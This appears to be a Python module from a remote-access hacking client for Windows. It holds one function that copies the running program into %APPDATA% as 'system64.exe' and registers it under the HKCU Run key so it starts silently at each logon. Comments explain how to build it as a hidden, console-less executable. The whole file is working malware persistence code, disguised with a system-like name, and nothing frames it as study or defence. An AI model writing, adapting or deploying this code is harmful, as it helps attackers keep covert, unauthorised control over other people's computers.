import sys
import os
import shutil
import winreg


def becomePersistant(my_socket):
    print("[+] Becoming persistant by adding registyr keys to statup program")
    # copy the current executable to some directory
    # we will use the %appdata% directory
    # create exe with pyinstaller in the main hack_client folder
    # pyinstaller --onefile --noconsole --name="system64.exe" main_client.py
    current_exe = sys.executable
    app_data = os.getenv("APPDATA")
    to_save_file = app_data + "\\" + "system64.exe"

    if not os.path.exists(to_save_file):
        shutil.copyfile(current_exe, to_save_file)

        key = winreg.HKEY_CURRENT_USER
        # Path to store current key "Software\Microsoft\Windows\CurrentVersion\Run"
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        key_obj = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key_obj, "sys file", 0, winreg.REG_SZ, to_save_file)
        winreg.CloseKey(key_obj)